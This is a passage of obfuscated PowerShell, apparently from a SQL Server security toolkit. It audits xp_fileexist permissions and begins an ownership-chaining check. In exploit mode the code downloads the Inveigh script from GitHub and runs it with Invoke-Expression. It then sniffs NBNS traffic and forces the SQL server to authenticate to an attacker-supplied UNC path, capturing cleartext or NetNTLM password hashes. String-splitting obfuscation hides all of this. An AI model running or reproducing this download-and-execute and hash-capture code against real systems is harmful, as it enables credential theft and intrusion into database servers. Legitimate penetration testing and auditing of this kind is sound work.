            &("{2}{0}{1}" -f'Ve','rbose','Write-') -Message ("$Instance "+': '+'COMPLET'+'ED'+' '+'VULNER'+'ABILIT'+'Y '+'CHE'+'CK: '+'Exc'+'essiv'+'e '+'Priv'+'ile'+'g'+'e '+'- '+'xp_'+'fi'+'lee'+'xist.')
            Return
        }
        else
        {
            &("{1}{0}{2}{3}" -f 'V','Write-','erbo','se') -Message ("$Instance "+': '+'CO'+'NNECT'+'IO'+'N '+'SUCC'+'ESS.')
        }

        
        
        ${sErve`R`inFo} = &("{2}{3}{0}{1}" -f'I','nfo','Get-SQLServ','er') -Instance ${I`Ns`TaN`Ce} -Username ${US`E`RnAmE} -Password ${PASsW`O`Rd} -Credential ${c`ReDe`NTI`AL} -SuppressVerbose
        ${CO`MpuTEr`Na`ME} = ${serVeR`i`Nfo}."Compu`TE`RNAme"
        ${CURRE`Nt`LoG`IN} = ${Serv`ErI`Nfo}."Cu`RRe`Ntlo`giN"
        ${Cur`R`ENtl`O`ginroles} = &("{2}{4}{1}{0}{3}"-f'em','eM','Get-SQL','ber','ServerRol') -Instance ${i`NsTAn`ce} -Username ${usE`R`NaME} -Password ${p`ASSW`OrD} -Credential ${CRedeN`TI`AL} -PrincipalName ${CURrent`LO`GIN}  -SuppressVerbose
        ${Cur`R`enT`Pr`iNcpa`LLISt} = @()
        ${c`U`RRentpRI`N`c`PAlliST} += ${CUr`ReNTL`OgiN}
        ${cuRr`EN`TpR`I`NCPALLiSt} += ("{0}{2}{1}" -f 'P','blic','u')
        ${C`URREN`TlO`giNRolEs} | &("{3}{2}{0}{1}"-f 'Ob','ject','Each-','For') -Process {
            ${cUrRen`T`PriN`cpAL`LISt} += ${_}."R`OLE`pRIncIpalNA`Me"
        }

        
        
        
        if(${ex`ploIT})
        {
            ${tesTM`O`dE}  = ("{0}{1}"-f 'Explo','it')
        }
        else
        {
            ${t`Es`TM`OdE}  = ("{1}{0}"-f 'it','Aud')
        }
        ${VULNEr`Ab`iLITy} = ("{2}{0}{1}{4}{8}{5}{6}{3}{7}"-f 'x','cessive','E','ecute xp_fil',' Privi','E','x','eexist','lege - ')
        ${Des`CripT`iON}   = ("{110}{45}{136}{129}{121}{63}{160}{62}{71}{114}{139}{3}{70}{124}{4}{1}{154}{78}{9}{77}{13}{5}{58}{99}{72}{6}{23}{50}{40}{147}{157}{67}{82}{86}{125}{109}{137}{91}{89}{21}{44}{7}{126}{100}{88}{74}{143}{15}{140}{60}{61}{51}{107}{151}{35}{76}{94}{65}{119}{102}{118}{115}{16}{134}{27}{53}{19}{131}{68}{59}{98}{149}{141}{113}{31}{28}{43}{34}{81}{29}{159}{103}{144}{2}{161}{152}{30}{55}{122}{104}{26}{42}{135}{32}{64}{47}{106}{116}{20}{10}{162}{164}{24}{112}{12}{46}{90}{36}{93}{22}{17}{52}{38}{83}{79}{127}{128}{87}{108}{0}{73}{117}{66}{57}{56}{130}{37}{111}{49}{25}{120}{33}{48}{145}{11}{132}{142}{69}{97}{96}{156}{153}{95}{158}{18}{85}{155}{101}{92}{123}{163}{41}{105}{54}{84}{150}{133}{14}{138}{148}{75}{146}{80}{39}{8}" -f 'ysad','red','a','xt','o','e ',' ',' Server ','ult.','ced','r',' th','e u','r','er 2',' can be ','n','a','mbe','cke','rt','in SQ','l','be exe','ca','ng used.  Thats b','a','ica','ash','en b','layed to gain u','h',' syst','cau',' t','rver ','sc','account',' a','fa','uted by me','m','cce',' can','L','_f','sed','his also ','s','snt bei','c','force the S','te','te to a remote atta',' role in S','nauth','ged','mana','that',' ','e','d to ','s a n','s','ems. T','e ','chine or ',' Pub','he service','r service','end','ati','n','min when ','tr','0','ser','u','ro','lowe','by de','h','lic',' ','QL ','r',' role b','er to','_dir',' ',' to e','lt','the','a','vic','m','un',' acco','account ',' ca',' Xp','of ','nt to','ured + c',' ','in','mean','QL',' s','defa','xp',' i','n b','ssword ','ve ','authe','s xp_di','a ma',' ','accou','e','i','orized',' sysa','ed st','y ','2000-2014.','r pr','ivileged us','x',' ','r.  T','e S','rv','t','ss to','ilee','u','00','e','us','a','QL Serve','ee','r','e','14, ','mber','0-2','p','Se',' Se',' or re',' is a ',' p',' ','t','s of the','e','e capt','t i','cked','e','d','e ')
        ${rEMEDi`A`TI`oN}   = ("{29}{25}{38}{31}{5}{37}{30}{23}{11}{34}{40}{36}{26}{33}{24}{12}{42}{7}{14}{3}{20}{13}{19}{10}{2}{32}{22}{18}{1}{0}{27}{28}{21}{9}{15}{8}{41}{35}{4}{6}{39}{16}{17}"-f ' Exa','les. ','o','r non adminis','t',' EX',' to','ur','VOKE EXECUTE ON xp_f',':','l','vile',' pr','ative','e fo',' RE','bli','c',' ro',' ','tr','mand','nd','pri','ist','m','he xp_f','mple',' com','Re','UTE ','ve','gins a','ileex','ges','xis','n t','EC','o',' Pu',' o','ilee','oced')
        ${se`VE`RIty}      = ("{0}{1}"-f'M','edium')
        ${I`svU`L`Ner`ABLe}  = 'No'
        ${i`S`e`XPLOI`Table} = 'No'
        ${e`XpLOI`T`ed}     = 'No'
        ${e`x`pLOitCMD}    = ("{12}{10}{0}{11}{4}{1}{13}{2}{5}{14}{15}{9}{6}{8}{3}{7}" -f 'the pass','h','e ','nother','s','or re','o ',' system.','a',' it t','k ','word ha','Crac',' offlin','la','y')
        ${DE`TAI`ls}       = ''
        ${Refe`R`eNce}     = ("{12}{1}{8}{6}{0}{7}{9}{13}{4}{2}{10}{3}{11}{5}" -f '.c','ttps','ac','ql-server-','tt','ing-metasploit/','.netspi','om/execut','://blog','ing','ks-via-s','us','h','-smb-relay-a')
        ${AU`Th`OR}        = (("{2}{8}{5}{4}{7}{0}{3}{6}{1}"-f 'nullbi','PI 2016','Sc','nd), Net','h','Sut','S','erland (@_','ott '))

        
        
        
        

        
        ${DiR`TR`E`ePRI`Vs} = &("{0}{3}{2}{1}"-f 'Get','iv','DatabasePr','-SQL') -Instance ${i`Nst`Ance} -Username ${US`E`RnAME} -Password ${Pass`wO`Rd} -Credential ${CredeN`Ti`AL} -DatabaseName ("{2}{1}{0}"-f'er','ast','m') -SuppressVerbose | &("{0}{1}{3}{2}" -f 'Wh','ere','ject','-Ob') -FilterScript {
            ${_}."O`BJec`TnAmE" -eq ("{1}{0}{2}" -f'_fi','xp','leexist') -and ${_}."pE`RmiS`SiONnAME" -eq ("{1}{2}{0}"-f'CUTE','EX','E') -and ${_}."S`TATed`eScR`IP`TiOn" -eq ("{0}{1}"-f 'gra','nt')
        }

        
        if(${DIRtRE`epRI`VS})
        {
            
            &("{1}{2}{0}" -f'se','Writ','e-Verbo') -Message ("$Instance "+': '+'- '+'Th'+'e '+"$PrincipalName "+'princ'+'ip'+'al'+' '+'h'+'as '+'EXE'+'C'+'UTE '+'privi'+'l'+'eges'+' '+'on'+' '+'x'+'p_'+'f'+'ileexist.')

            ${isVULnEr`A`BLE}  = 'Yes'
            ${d`IRT`REe`pRiVs} |
            &("{3}{1}{0}{2}{4}"-f'h','c','-Ob','ForEa','ject') {
                ${PrIn`ciPAlNa`ME} = ${DiRtReeP`RI`Vs}."PriNC`IPaLn`Ame"

                
                ${cu`RR`E`Nt`pRInCPA`llI`ST} |
                &("{2}{1}{0}{3}" -f'Each','or','F','-Object') {
                    ${PriN`CIp`Al`cHeCK} = ${_}

                    if(${p`Ri`NciPa`LN`AME} -eq ${PRIN`CIP`AL`ChE`Ck})
                    {
                        ${i`s`EXpLoI`TABLe}  = 'Yes'

                        
                        
                        ${cURREN`T`Id`eN`TITy} =   $UtNjp::("{1}{0}{2}"-f'ur','GetC','rent').Invoke()
                        ${P`RP} = &("{1}{2}{0}" -f 'ct','N','ew-Obje') -TypeName ("{1}{7}{0}{5}{8}{4}{3}{9}{6}{2}" -f'ecu','S','l','Window','ncipal.','rit','ncipa','ystem.S','y.Pri','sPri') -ArgumentList (${C`U`RR`ENTi`DEntiTy})
                        ${a`DM} =   $mGi::"admInI`s`TR`AtOr"
                        ${IS`AD`MIn} = ${P`Rp}.("{0}{1}{2}" -f 'Is','In','Role').Invoke(${A`DM})
                        if (-not ${iSAdm`iN})
                        {
                            &("{0}{3}{1}{2}" -f 'Wri','rbos','e','te-Ve') -Message ("$Instance "+': '+'- '+'You'+' '+'do'+' '+'not'+' '+'h'+'ave '+'A'+'dminist'+'r'+'ator '+'rig'+'h'+'ts. '+'R'+'un '+'th'+'is '+'fu'+'nct'+'ion '+'as'+' '+'a'+'n '+'Ad'+'mini'+'strato'+'r '+'i'+'n '+'o'+'rder '+'to'+' '+'l'+'oad '+'I'+'nveigh.')
                            ${I`AMAd`MIn} = 'No'
                        }
                        else
                        {
                            &("{1}{0}{3}{2}" -f 'te-','Wri','erbose','V') -Message ("$Instance "+': '+'- '+'Yo'+'u '+'hav'+'e '+'Adminis'+'trat'+'o'+'r '+'rig'+'hts. '+'Inv'+'eigh'+' '+'w'+'ill '+'be'+' '+'loa'+'d'+'ed.')
                            ${iaMa`DM`In} = 'Yes'
                        }

                        
                        if(-not ${aTTa`CKe`RIP})
                        {
                            ${A`Tt`Ackerip} = (&("{3}{0}{2}{1}" -f '-Conn','n','ectio','Test') -ComputerName ("{1}{2}{0}"-f'1','12','7.0.0.') -Count 1 |
                            &("{4}{0}{1}{3}{2}"-f'e','ct-','t','Objec','Sel') -ExpandProperty ("{0}{2}{1}" -f 'Ipv4A','ess','ddr') |
                            &("{1}{0}{2}"-f 'elect-Ob','S','ject') -Property ("{1}{0}{2}{4}{3}" -f'P','I','AddressT','ring','oSt') -ExpandProperty ("{3}{2}{5}{4}{1}{0}" -f'g','in','sT','IPAddres','tr','oS'))

                            if(${ATtA`CkEr`IP} -eq ("{0}{2}{1}" -f '127','.1','.0.0'))
                            {
                                ${aT`T`AcKErIP} = &("{0}{3}{1}{2}{4}"-f'G','t-WmiOb','jec','e','t') -Class ("{5}{8}{1}{3}{0}{7}{9}{2}{6}{4}" -f 'adapt','_networ','gurat','k','on','wi','i','e','n32','rconfi') -Filter ((("{1}{0}{2}{3}" -f 'l','ipenab','ed = 7yuTr','ue7yu'))  -REplaCE  ([chAR]55+[chAR]121+[chAR]117),[chAR]39) -ComputerName ${EN`V`:cOmp`UTEr`NaMe} |
                                &("{1}{2}{0}{3}" -f 'bje','Sele','ct-O','ct') -First 1 -Property @{
                                    ("{1}{0}"-f'ame','N')       = ("{1}{2}{0}"-f 's','IPAdd','res')
                                    ("{1}{2}{0}" -f 'ion','Exp','ress') = {
                                        [regex]${rx} = '(\d{1,3}(\.?)){4}'; ${rx}.("{1}{0}"-f'tches','ma').Invoke(${_}."Ip`ADDRe`Ss")[0]."va`LUE"
                                    }
                                } |
                                &("{3}{2}{0}{4}{1}" -f 'ect','t','l','Se','-Objec') -Property ("{2}{0}{1}" -f'd','dress','IPa') -ExpandProperty ("{2}{0}{1}"-f 'PAddre','ss','I') -First 1
                            }
                        }

                        
                        if(${iamaD`M`IN} -eq 'Yes')
                        {
                            
                            
                            

                            
                            &("{1}{4}{3}{0}{2}"-f'pressio','Invoke','n','Ex','-') -Command (&("{1}{2}{0}{3}"-f'je','New','-Ob','ct') -TypeName ("{1}{0}{4}{5}{2}{3}"-f 'ste','sy','we','bclient','m','.net.')).("{1}{3}{4}{0}{2}"-f 't','dow','ring','n','loads').Invoke(("{14}{4}{7}{6}{0}{12}{10}{3}{11}{9}{5}{13}{2}{8}{1}"-f 'e','igh.ps1','master/In','m','ttps://','oberts','hubusercont','raw.git','ve','in-R','co','/Kev','nt.','on/Inveigh/','h'))

                            ${TE`s`TIt} = &("{0}{2}{1}"-f'T','h','est-Pat') -Path ((("{5}{3}{0}{4}{2}{6}{1}" -f'nction:','e-Inveigh','cm','u','D','F','Invok'))  -rePlaCe ([chAR]68+[chAR]99+[chAR]109),[chAR]92)
                            if(${t`EStIt} -eq ("{0}{1}" -f 'T','rue'))
                            {
                                &("{1}{0}{2}"-f'erbos','Write-V','e') -Message ("$Instance "+': '+'- '+'Inv'+'e'+'igh '+'lo'+'a'+'ded.')

                                
                                ${insta`NCe`Ip} =   $Qvnj6::("{0}{2}{3}{1}"-f 'GetHostAdd','ses','r','es').Invoke(${C`om`puTErNAme})

                                
                                &("{0}{1}{3}{2}"-f'Write-V','e','bose','r') -Message ("$Instance "+': '+'- '+'Star'+'t '+'sn'+'if'+'fing...')
                                ${n`UlL} = &("{3}{2}{4}{1}{0}" -f 'eigh','nv','o','Inv','ke-I') -HTTP ('N') -NBNS ('Y') -MachineAccounts ('Y') -WarningAction ("{1}{4}{0}{3}{2}" -f'C','Sile','nue','onti','ntly') -IP ${a`T`Tack`ERip}

                                
                                ${p`ATh} = (-join ((65..90) + (97..122) | &("{3}{0}{2}{1}" -f'a','dom','n','Get-R') -Count 5 | &('%') {[char]${_}}))

                                
                                &("{4}{0}{2}{3}{1}" -f 'rite','se','-Ver','bo','W') -Message ("$Instance "+': '+'- '+'I'+'nject '+'UNC'+' '+'p'+'ath '+'t'+'o '+"\\$AttackerIp\$path...")
                                ${Nu`LL} = &("{1}{0}{2}" -f'et-SQ','G','LQuery') -Instance ${iN`St`AnCE} -Username ${uS`e`R`NAmE} -Password ${P`AsSW`ORD} -Credential ${Cre`D`ENtI`AL} -Query ('xp_f'+'ile'+'exis'+'t '+"'\\$AttackerIp\$path'") -TimeOut 10 -SuppressVerbose

								
								&("{1}{0}{2}" -f'te-Verbo','Wri','se') -Message ("$Instance "+': '+'- '+'Sleep'+'i'+'ng '+'f'+'or '+"$TimeOut "+'se'+'conds'+' '+'to'+' '+'ensu'+'re '+'t'+'he '+'ha'+'sh '+'com'+'es '+'b'+'ack')
                                &("{2}{0}{3}{1}" -f 'art-','ep','St','Sle') -s ${t`i`MeOut}

                                
                                ${n`ULl} = &("{2}{3}{1}{0}"-f'gh','ei','St','op-Inv')
                                &("{3}{4}{1}{0}{2}"-f 'e-Ver','it','bose','W','r') -Message ("$Instance "+': '+'- '+'S'+'topp'+'ed '+'sn'+'i'+'ffing.')

                                ${ha`sh`TYpe} = ''
                                ${h`ASH} = ''

                                [string]${PasSC`LE`Ar`TEXT} = &("{0}{1}{2}" -f'Get-I','n','veigh') -Cleartext
                                if(${PassC`Le`Arte`Xt})
                                {
                                    ${haSH`Ty`Pe} = ("{0}{2}{1}"-f 'Clear','ext','t')
                                    ${h`AsH} = ${passCl`Ear`Te`Xt}
                                }

                                [string]${PASSNeT`N`Tlm`V1} = &("{2}{0}{3}{1}" -f'Inve','gh','Get-','i') -NTLMv1
                                if(${PAS`SNETn`T`lMv1})
                                {
                                    ${h`ASHt`YPe} = ("{0}{1}{2}"-f'N','e','tNTLMv1')
                                    ${Ha`Sh} = ${pas`SnE`Tn`TLmv1}
                                }

                                [string]${Pa`SsNE`TNTL`Mv2} = &("{3}{1}{2}{0}"-f'igh','-','Inve','Get') -NTLMv2
                                if(${pA`SSNe`TnTlmV2})
                                {
                                    ${HaS`hT`YPE} = ("{1}{0}"-f'2','NetNTLMv')
                                    ${H`Ash} = ${p`ASSneTNtlM`V2}
                                }

                                if(${h`ASh})
                                {
                                    
                                    &("{0}{1}{2}"-f 'Write-Ve','rb','ose') -Message ("$Instance "+': '+'- '+'Re'+'cov'+'ered '+"$HashType "+'hash'+':')
                                    &("{1}{2}{0}"-f 'erbose','Writ','e-V') -Message ("$Instance "+': '+'- '+"$Hash")
                                    ${Exp`lo`iteD} = 'Yes'
                                    ${deTa`I`LS} = ('Th'+'e '+"$PrincipalName "+'pr'+'in'+'cipal'+' '+'h'+'as '+'EXEC'+'UTE'+' '+'pri'+'vi'+'le'+'ges '+'o'+'n '+'xp_fi'+'leexist'+' '+'p'+'roce'+'dure '+'in'+' '+'t'+'he '+'mast'+'er '+'dat'+'aba'+'se. '+'Rec'+'over'+'ed '+'pa'+'sswo'+'r'+'d '+'h'+'ash! '+'Has'+'h '+'type'+' '+'= '+"$HashType;Hash "+'= '+"$Hash")
                                }
                                else
                                {
                                    
                                    ${EXP`L`oITeD} = 'No'
                                    ${DetAi`LS} = ('T'+'he '+"$PrincipalName "+'pri'+'nc'+'i'+'pal '+'h'+'as '+'E'+'XEC'+'UTE '+'pr'+'ivil'+'eges '+'on'+' '+'x'+'p_fileex'+'is'+'t '+'pr'+'ocedu'+'re'+' '+'in'+' '+'t'+'he '+'ma'+'s'+'ter '+'dat'+'aba'+'se'+'. '+' '+'xp'+'_f'+'ileex'+'ist '+'Exec'+'ute'+'d, '+'but'+' '+'n'+'o '+'passw'+'o'+'rd '+'ha'+'sh '+'wa'+'s '+'recove'+'red'+'.')
                                }

                                
                                ${n`UlL} = &("{0}{3}{1}{2}" -f 'Cl','ig','h','ear-Inve')
                            }
                            else
                            {
                                &("{1}{2}{0}"-f 'ose','Wr','ite-Verb') -Message ("$Instance "+': '+'- '+'Invei'+'gh '+'could'+' '+'n'+'ot '+'be'+' '+'loa'+'ded.')
                                
                                ${explOi`T`ed} = 'No'
                                ${dET`Ai`lS} = ('The'+' '+"$PrincipalName "+'pr'+'incipa'+'l '+'h'+'as '+'EX'+'ECU'+'TE '+'pri'+'vile'+'ges '+'on'+' '+'x'+'p_fileex'+'ist '+'pr'+'oc'+'e'+'dure '+'i'+'n '+'th'+'e '+'m'+'aster '+'datab'+'as'+'e'+', '+'bu'+'t '+'Inveigh'+' '+'could'+' '+'n'+'ot '+'b'+'e '+'loa'+'ded '+'so'+' '+'n'+'o '+'passwo'+'rd'+' '+'h'+'ashes '+'cou'+'ld'+' '+'be'+' '+'re'+'co'+'vered.')
                            }
                        }
                        else
                        {
                            
                            ${EXPL`oIt`ED} = 'No'
                            ${de`TAi`Ls} = ('T'+'he '+"$PrincipalName "+'p'+'rinc'+'ipal'+' '+'h'+'as '+'EXECUTE'+' '+'pr'+'iv'+'ile'+'ges '+'o'+'n '+'xp_fil'+'ee'+'xist'+' '+'p'+'rocedure'+' '+'i'+'n '+'the'+' '+'m'+'ast'+'er '+'data'+'base'+'.')
                        }
                    }
                    else
                    {
                        
                        ${iSEXPlOi`T`AB`Le}  = 'No'
                        ${D`Et`AILS} = ('The'+' '+"$PrincipalName "+'princip'+'a'+'l '+'h'+'as '+'EXECU'+'T'+'E '+'pr'+'ivile'+'ges '+'o'+'n '+'xp_'+'file'+'exi'+'s'+'t '+'pr'+'o'+'cedur'+'e '+'i'+'n '+'t'+'he '+'ma'+'st'+'er '+'d'+'atabas'+'e.')
                    }
                }

                
                ${nU`Ll} = ${tbl`DA`TA}."r`Ows".("{0}{1}" -f 'A','dd').Invoke(${c`om`Pu`Ter`NAME}, ${IN`StaNCe}, ${VUlN`eR`AbI`lITY}, ${Des`CRIp`Ti`On}, ${rE`m`Ed`IatiON}, ${s`eVe`Rity}, ${IsVuLnE`RaB`le}, ${Is`e`XPL`oIT`ABLE}, ${EX`p`loI`TED}, ${E`x`PLoitCmd}, ${dE`T`AILs}, ${r`eFer`eNce}, ${AUTH`or})
            }      
        }else{
            &("{2}{0}{1}" -f 'Verbos','e','Write-') -Message ("$Instance "+': '+'- '+'No'+' '+'l'+'ogins'+' '+'were'+' '+'fo'+'und '+'wi'+'th '+'th'+'e '+'EX'+'EC'+'UTE '+'p'+'rivile'+'ge '+'o'+'n '+'xp_fileexi'+'st'+'.')
        }
    }

    End
    {
        
        &("{2}{1}{0}"-f'e','erbos','Write-V') -Message ("$Instance "+': '+'COMPLE'+'TE'+'D '+'VULN'+'ERA'+'BIL'+'I'+'TY '+'C'+'HECK: '+'E'+'xcessive'+' '+'Pri'+'vi'+'le'+'ge '+'- '+'xp_file'+'e'+'x'+'ist')

        
        if ( -not ${n`OoUT`pUT})
        {
            Return ${T`BLD`AtA}
        }
    }
}






Function iN`V`oKE-SQLaUd`iTPR`Iv`dBC`hAin`I`Ng
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANDAtorY = ${f`Alse},
                ValuEFrOmPIpEliNeBYprOpErtyNAMe = ${TR`Ue},
        HELPMeSsAGE = {"{1}{4}{7}{5}{8}{6}{2}{0}{3}"-f 'w','SQL S','t to authenticate ','ith.','erver ','in acco','n','or doma','u'})]
        [string]${Use`R`Na`mE},

        [Parameter(mAndaTorY = ${Fa`lse},
                vAlUeFroMpiPEliNEByprOPerTYnaMe = ${T`RuE},
        HelPmeSSaGE = {"{3}{11}{10}{6}{5}{1}{4}{8}{9}{7}{0}{2}" -f'wi',' account password t','th.','SQL','o','or domain','rver ','nticate ',' auth','e','e',' S'})]
        [string]${P`AsS`word},

        [Parameter(mAndAtorY = ${f`A`lSE},
                VALUEfrOmPipELINEbyprOPeRTYNAme = ${TR`UE},
        HELpMeSsAGE = {"{4}{0}{2}{6}{3}{1}{5}"-f 'n','e','do','red','Wi','ntials.','ws c'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CrEd`ENT`i`AL} =  ( IteM VaRiaBle:0459m2).vALUE::"E`MPty",

        [Parameter(MANdatORY = ${f`AlsE},
                valueFrOMpiPEliNEbYPROpertYnAme = ${Tr`Ue},
        HelpMESsAgE = {"{5}{2}{1}{4}{3}{7}{0}{6}"-f' to','e','QL Serv','onnect','r instance to c','S','.','ion'})]
        [string]${I`N`sTAnce},

        [Parameter(mandatoRy = ${F`AlSe},
        heLPmESSaGE = {"{4}{1}{0}{2}{5}{3}"-f ' defa','non','ult ','s.','Only select ','database'})]
        [switch]${n`oD`EFauLTS},

        [Parameter(MandAtoRY = ${F`AlSE},
        hELPmESSage = {(("{2}{0}{6}{3}{4}{1}{5}" -f 'nHlst','n','Do','output',' a','ything.',' '))."rep`lAcE"('Hls',[sTRInG][chaR]39)})]
        [switch]${N`OOuT`p`Ut},

        [Parameter(manDaTOrY = ${fAl`SE},
        HELPMeSSAGE = {"{6}{1}{3}{7}{4}{5}{2}{0}" -f's.','vul','e','nerab',' i','ssu','Exploit ','le'})]
        [switch]${EX`PlOIT}
    )

    Begin
    {
        
        ${tbL`D`AtA} = &("{0}{2}{1}"-f'New-Obj','ct','e') -TypeName ("{1}{4}{3}{5}{2}{0}" -f 'ble','Sy','a','D','stem.','ata.DataT')
        ${nu`Ll} = ${t`BL`dAtA}."coLuM`NS".("{1}{0}" -f'd','Ad').Invoke(("{0}{3}{1}{2}"-f'C','terNa','me','ompu'))
        ${N`UlL} = ${TBLd`ATa}."ColU`m`NS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f'Instanc','e'))
        ${Nu`LL} = ${TB`ldATA}."COLu`m`NS".("{1}{0}" -f'dd','A').Invoke(("{0}{3}{2}{1}" -f 'Vu','y','lit','lnerabi'))
        ${N`ULL} = ${tB`lD`ATA}."c`oL`UMNS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}" -f'n','escriptio','D'))
        ${N`ULl} = ${t`B`ldATA}."cOLUm`Ns".("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{0}{2}"-f'o','Remedia','n','ti'))
        ${Nu`ll} = ${TBLDA`Ta}."CO`LUMnS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f 'everity','S'))
        ${n`ULl} = ${T`BldA`Ta}."Co`LU`mnS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}{2}{3}" -f 'Vuln','Is','era','ble'))
        ${NU`LL} = ${T`BLDA`TA}."c`O`luMNs".("{1}{0}" -f 'd','Ad').Invoke(("{2}{3}{0}{1}" -f 'x','ploitable','Is','E'))
        ${nu`ll} = ${Tb`ldA`TA}."co`L`UMnS".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}"-f'x','E','ploited'))
        ${Nu`ll} = ${Tb`ldA`Ta}."CoLU`mns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{3}{1}"-f 'l','Cmd','Exp','oit'))
        ${nu`ll} = ${TBLd`A`TA}."C`OLum`Ns".("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}"-f'et','D','ails'))
        ${N`Ull} = ${TB`Lda`TA}."ColUm`NS".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}" -f'e','Refer','nce'))
        ${n`UlL} = ${TbLD`ATA}."C`oLuMns".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}" -f 'or','Auth'))
    }

    Process
    {
        
        &("{2}{1}{0}"-f'e-Verbose','rit','W') -Message ("$Instance "+': '+'ST'+'ART '+'VU'+'LNERABI'+'LITY '+'C'+'H'+'ECK: '+'Exc'+'ess'+'ive '+'Privi'+'lege'+' '+'- '+'Da'+'tab'+'ase '+'O'+'wne'+'rshi'+'p '+'Ch'+'ain'+'ing')

        
        ${TeST`CoNne`C`Ti`oN} = &("{0}{2}{3}{6}{4}{5}{1}"-f 'G','t','e','t-SQL','ect','ionTes','Conn') -Instance ${In`STA`NCE} -Username ${US`e`R`NaME} -Password ${paS`Swo`RD} -Credential ${cRe`DE`NTi`Al} -SuppressVerbose | &("{1}{2}{0}" -f'ct','Where-','Obje') -FilterScript {
            ${_}."ST`AtUs" -eq ("{1}{0}{2}{3}"-f 'cc','A','ess','ible')
        }
        if(-not ${t`EStCon`NectI`on})
        {
            
            &("{3}{1}{0}{2}{4}" -f'V','e-','e','Writ','rbose') -Message ("$Instance "+': '+'CO'+'NN'+'ECTION '+'FAIL'+'E'+'D.')
            &("{3}{2}{4}{1}{0}" -f 'e','bos','te-Ve','Wri','r') -Message ("$Instance "+': '+'COMPLET'+'ED'+' '+'VU'+'L'+'N'+'ERABILI'+'TY '+'C'+'HE'+'CK: '+'Exc'+'essi'+'ve '+'Privi'+'lege'+' '+'- '+'D'+'atabase'+' '+'Owne'+'rship'+' '+'Cha'+'ining'+'.')
            Return
        }
        else
        {
            &("{0}{1}{2}"-f'W','rite-Verb','ose') -Message ("$Instance "+': '+'CONNE'+'CTIO'+'N '+'SUC'+'C'+'ESS.')
        }

        
        ${SErv`erI`NfO} = &("{4}{3}{0}{1}{2}" -f'v','erInf','o','LSer','Get-SQ') -Instance ${iNSTA`N`CE} -Username ${USERn`A`Me} -Password ${PAsSw`O`RD} -Credential ${C`Re`dE`NtIAl} -SuppressVerbose
        ${CURReNT`Lo`G`IN} = ${sErver`I`Nfo}."CURR`ENTLO`gin"
        ${compUTer`Na`ME} = ${S`E`RveR`InfO}."comP`U`TErn`AmE"

        
        
        
        if(${EXPl`O`iT})
        {
            ${tEs`TMO`De}  = ("{0}{1}"-f 'Ex','ploit')
        }
        else
        {
            ${tE`st`mOdE}  = ("{1}{0}"-f 'dit','Au')
        }
        ${vULnER`A`BiliTY} = ("{7}{4}{8}{6}{5}{9}{2}{1}{0}{12}{11}{10}{3}{13}" -f ' O','ase','ge - Datab',' ','siv','r','P','Exces','e ','ivile','p','nershi','w','Chaining')
        ${dE`s`CRIptION}   = ("{16}{17}{6}{15}{3}{4}{18}{10}{9}{19}{12}{0}{14}{23}{5}{7}{21}{13}{1}{8}{11}{20}{2}{22}"-f '  Enabling ow','access','r','was found enabled at th','e ',' le','hai','ad',' to databas','e',' databas','e res','vel.','unauthorized ','nership chainin','ning ','Owne','rship c','server or',' le','ou',' to ','ces.','g can')
        ${reM`eDIAT`I`On}   = ((("{52}{67}{19}{36}{38}{70}{58}{63}{62}{49}{59}{14}{56}{75}{27}{20}{55}{60}{21}{65}{22}{73}{54}{48}{2}{32}{42}{9}{45}{11}{10}{5}{35}{40}{39}{6}{3}{12}{30}{53}{57}{71}{61}{47}{15}{78}{8}{46}{0}{37}{28}{18}{29}{50}{66}{13}{43}{24}{80}{44}{76}{69}{31}{72}{64}{79}{68}{41}{4}{51}{1}{16}{25}{23}{17}{77}{26}{7}{33}{74}{34}"-f '{','{',' {0',' {','DB_CH','query','ilar to','le chain','A','s','  A ','.','0}','ing.  A query s','s',' DB','0} ca',' ','ed en','u','is','ing_','ag ','sed','milar ','n be u','disab','he {0}',' us','able ch','ALTER ','AS','}f','i','.',' ','red ','0} is','the ','m','si','T ','al','i','ALT','e{0}','INING ON','1 SET',' to','ab','ai','AINING OFF;','Conf','DATAB',' set','_','o','ASE D','fe','ase ','db_chain','base','d dat','cte','D','on{0} fl','n','ig','SE','DATAB','af','ata','E ','is','ng',' t','ER ','to ','_CH','atabase1 ','to {0}'))  -F  [CHaR]39)
        ${sE`Ve`R`ITY}      = 'Low'
        ${I`sVUL`NEr`AB`Le}  = 'No'
        ${IS`ExP`lO`i`TaBLE} = 'No'
        ${exPLOI`T`Ed}     = 'No'
        ${eXPl`O`iTcMd}    = ("{13}{3}{6}{9}{2}{10}{5}{11}{4}{1}{0}{8}{7}{12}"-f 'a','ble ','exp','h','a','i','ere','is ','t th',' is not ','loit ava','l','time.','T')
        ${de`TAiLs}       = ''
        ${RE`FEren`cE}     = ("{8}{18}{1}{15}{24}{0}{2}{20}{21}{16}{14}{7}{11}{3}{22}{9}{10}{4}{6}{5}{17}{19}{12}{13}{23}"-f'com/en-us/','chne','library/','ps','us/li','59(v=v','brary/bb6690',',ht','h','sdn.microsof','t.com/en-','t','.','a','676(v=sql.105).aspx','t.m','88','s.','ttps://te','110)','m','s1','://m','spx ','icrosoft.')
        ${AUT`HOr}        = ("{4}{6}{7}{10}{5}{8}{2}{3}{9}{1}{0}"-f'16','0','Ne','tS','Scott Su','bind','therland',' (@_nul','), ','PI 2','l')

        
        
        
        

        

        if(${no`d`eF`AUlTS})
        {
            ${Ch`AIndat`AbA`SES} = &("{2}{3}{1}{0}"-f'e','Databas','Get-S','QL') -Instance ${InStA`N`ce} -Username ${USE`R`NA`Me} -Password ${P`As`SwOrD} -Credential ${cr`ED`EnT`iAL} -NoDefaults -SuppressVerbose | &("{0}{3}{2}{1}"-f 'W','ct','bje','here-O') -FilterScript {
                ${_}."is_db_c`hA`InI`Ng_ON" -eq ("{0}{1}" -f 'T','rue')
            }
        }
        else
        {
